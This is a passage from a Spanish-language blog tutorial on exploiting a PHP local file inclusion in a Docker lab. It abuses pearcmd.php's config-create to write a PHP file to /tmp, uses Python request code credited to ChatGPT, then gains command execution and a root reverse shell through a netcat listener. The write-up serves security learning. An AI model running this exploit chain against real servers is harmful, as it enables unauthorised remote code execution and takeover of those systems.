<p>Aquí el código por si lo quieres copiar:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/&lt;?<span class="o">=</span>phpinfo<span class="o">()</span>?&gt;+/tmp/hello.php HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 192.168.1.162:8080
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept: */*
</span></span><span class="line"><span class="cl">Accept-Language: en
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/87.0.4280.88 Safari/537.36
</span></span><span class="line"><span class="cl">Connection: close
</span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-46.png">
<em>&ldquo;Please give me Python syntax to send this raw HTTP request.&rdquo;</em></p>
<p>Código python sugerido por <em>ChatGPT</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.1.162:8080/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;close&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><p>→ este código sugerido será modificado.</p>
<p>Nos hacemos el archivo <em>hack.py</em> con el código sugerido por ChatGPT para ejecutar el GET <em>request</em> con python:</p>
<p><img src="../../../images/phplfitorce.es-47.png"></p>
<p>PERO: en vez de escribir la cadena <em>phpinfo()</em> en el <em>/tmp/hello.php</em></p>
<p>→ escribimos otro texto para verificar simplemente:</p>
<p><img src="../../../images/phplfitorce.es-48.png">
(el signo de + actúa como espacio)</p>
<h3 id="81-testing-usando-nuestro-hackpy">8.1. Testing usando nuestro <em>hack.py</em></h3>
<p>Dentro del contenedor podemos ver que en el <em>/tmp/</em> no tenemos más que el archivo <em>pear</em>:</p>
<p><img src="../../../images/phplfitorce.es-49.png"></p>
<p>Si ejecutamos el archivo Python:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 hack.py
</span></span></code></pre></div><p>Vemos que en el log se vé el GET:</p>
<p><img src="../../../images/phplfitorce.es-50.png"></p>
<p>Y si revisamos el contenido del directorio <em>/tmp</em>:</p>
<p><img src="../../../images/phplfitorce.es-51.png"></p>
<p>→ Se creó el <em><strong>hello.php</strong></em> que ahora podremos invocar usando nuestro LFI
→ se ejecutará (se interpreta) pues es un <em>.php</em></p>
<p><img src="../../../images/phplfitorce.es-52.png"></p>
<p>En este caso tiene un error en el <em>echo</em>, igualmente vemos que sí se ejecutó bien.</p>
<h3 id="82-ejecución-remota-de-comandos">8.2. Ejecución remota de comandos</h3>
<p>Podemos modificar el hack.py para que ejecute un comando de sistema, que se lo pasaremos en la URL mediante una variable &lsquo;c&rsquo;:</p>
<p><img src="../../../images/phplfitorce.es-53.png"></p>
<p>Lo ejecutamos de nuevo para generar un nuevo <em>hello.php</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 hack.py
</span></span></code></pre></div><p>Volvemos a listar en el contenedor en el /tmp:</p>
<p><img src="../../../images/phplfitorce.es-54.png"></p>
<p>Si le hacemos un <em>cat</em> al <em>hello.php</em>:</p>
<p><img src="../../../images/phplfitorce.es-55.png"></p>
<p>Y si vamos al navegador, veremos:</p>
<p><img src="../../../images/phplfitorce.es-56.png"></p>
<p>Tenemos un <strong>Warning</strong> pues no le hemos pasado el valor, es decir el comando, a la variable &lsquo;c&rsquo;:</p>
<h4 id="821-ejecutemos-el-comando-id">8.2.1. Ejecutemos el comando: id</h4>
<p>En la url tenemos que usar el LFI para invocar al archivo <em><strong>hello.php</strong>.</em></p>
<pre tabindex="0"><code>http://localhost:8000/?file=/tmp/hello.php&amp;c=id
</code></pre><p><img src="../../../images/phplfitorce.es-57.png"></p>
<p>Ya tenemos ejecución de comandos y si queremos podemos ejecutar <em>una reverse shell</em>.</p>
<h4 id="822-ganar-acceso">8.2.2. Ganar acceso</h4>
<p>Nuestra IP de Docker:</p>
<p><img src="../../../images/phplfitorce.es-58.png"></p>
<p>Vamos a la web de <em>revshells.com</em></p>
<p>Nos copiamos la cadena con el comando sugerido, la ejecutaremos con bash pero se la daremos codificada en base64:</p>
<p><img src="../../../images/phplfitorce.es-59.png"></p>
<p>Listener con <em>netcat</em> en el puerto 8888:</p>
<p><img src="../../../images/phplfitorce.es-60.png"></p>
<h5 id="8221-reverse-shell-en-el-hackpy">8.2.2.1. Reverse shell en el hack.py</h5>
<p>Nos copiamos el código en base64 para tenerlo guardado, o a la vista:</p>
<p><img src="../../../images/phplfitorce.es-61.png"></p>
<p>Creamos una nueva conexión:</p>
<p><img src="../../../images/phplfitorce.es-62.png"></p>
<p>Ejecutamos de nuevo el <em>hack.py</em> pero da un error → al parecer no le gustan los espacios.</p>
<p><img src="../../../images/phplfitorce.es-63.png">
Prueba con un &lsquo;+&rsquo; para evitar el espacio en blanco pero tampoco funciona.</p>
<p>→ vamos a hacerlo con <em>urlencode</em>; para eso, importamos la librería <em>urllib.parse</em></p>
<p><img src="../../../images/phplfitorce.es-64.png"></p>
<p><img src="../../../images/phplfitorce.es-65.png"></p>
<p>Ejecutamos de nuevo el <em>hack.py</em> y recibimos la <em>reverse shell</em>:</p>
<p><img src="../../../images/phplfitorce.es-66.png"></p>
<p><strong>¡Bien!, somos root:</strong></p>
<p><img src="../../../images/phplfitorce.es-67.png"></p>
<p><img src="../../../images/phplfitorce.es-68.png"></p>
<hr>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Youtube: <em><a href="https://www.youtube.com/watch?v=yq2rq50IMSQ&t=235s">John Hammond Youtube video</a></em>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Blog: <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Traducción: <a href="https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=es-419&_x_tr_pto=wapp">https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=es-419&amp;_x_tr_pto=wapp</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Sección interesante: <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content>
		</item>
		
	</channel>
</rss>
